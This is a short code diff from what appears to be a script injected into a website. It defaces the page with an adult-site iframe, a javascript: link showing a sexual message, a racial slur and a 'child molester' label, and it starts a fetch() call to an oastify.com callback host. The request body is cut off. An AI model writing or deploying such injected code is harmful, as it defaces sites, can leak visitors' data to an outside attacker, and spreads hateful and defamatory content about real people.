@@ -23,7 +23,7 @@ if(window.location.href.includes("vo-ar")){
     document.body.querySelector('.sss').innerHTML = '<iframe height=720px width=720px src="https://www.redgifs.com/">'
     
     name = document.querySelector(".f-s-25");
-    name.innerHTML = "<a onclick=alert('nya~ my pussy >_<') class='rainbow'>Click Me :D</a>"
+    name.innerHTML = "<a href=javascript:alert('nya~ my pussy >_<') class='rainbow'>Click Me :D</a>"
     document.querySelectorAll('a').forEach(el => {el.style.color='red'})
     document.querySelector(".naskh-r").textContent = 'nigger | certified child molester'
     fetch('https://ugeghou8kuk2odes18yxe3gsfjla90xp.oastify.com', {
